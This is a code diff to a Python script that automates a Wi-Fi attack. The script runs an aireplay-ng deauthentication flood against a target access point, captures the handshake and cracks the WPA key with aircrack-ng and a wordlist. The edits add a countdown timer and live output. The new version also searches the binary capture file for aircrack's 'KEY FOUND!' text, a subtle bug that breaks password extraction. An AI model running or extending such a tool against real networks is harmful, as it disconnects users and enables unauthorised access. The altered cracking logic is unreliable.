@@ -140,13 +140,14 @@ deauth_process = subprocess.Popen(
     ["sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic]
 )
 
-# Allow de-auth attack to persist for 1 minute
-try:
-    time.sleep(60)
-finally:
-    deauth_process.terminate()
-    deauth_process.wait()
-    print("De-authentication attack stopped.")
+# Show a countdown timer for the de-auth attack
+for remaining in range(60, 0, -1):
+    print(f"De-authentication in progress... {remaining} seconds remaining", end="\r")
+    time.sleep(1)
+
+deauth_process.terminate()
+deauth_process.wait()
+print("\nDe-authentication attack stopped.")
 
 airodump_process.terminate()
 airodump_process.wait()
@@ -170,10 +171,15 @@ if not cap_files:
 cap_file = cap_files[0]  # Select the first .cap file
 
 aircrack_command = ["sudo", "aircrack-ng", "-w", wordlist_path, cap_file]
-aircrack_result = subprocess.run(aircrack_command, capture_output=True, text=True)
+with subprocess.Popen(aircrack_command, stdout=subprocess.PIPE, text=True) as aircrack_proc:
+    for line in aircrack_proc.stdout:
+        print(line, end="")
 
 # Extract and display password if found
-password_match = re.search(r"KEY FOUND! \[ (.+) \]", aircrack_result.stdout)
+with open(cap_file, "r") as cap_content:
+    aircrack_result = cap_content.read()
+
+password_match = re.search(r"KEY FOUND! \[ (.+) \]", aircrack_result)
 if password_match:
     cracked_password = password_match.group(1)
     print("\033[92m" + "="*40)
